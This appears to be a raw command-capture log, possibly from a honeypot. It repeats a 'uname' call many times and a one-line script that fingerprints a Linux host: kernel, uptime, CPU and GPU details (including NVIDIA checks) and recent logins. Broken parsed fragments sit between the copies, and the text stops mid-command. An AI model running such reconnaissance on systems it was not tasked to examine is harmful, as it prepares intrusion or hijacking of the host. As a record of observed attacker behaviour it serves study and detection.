uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | 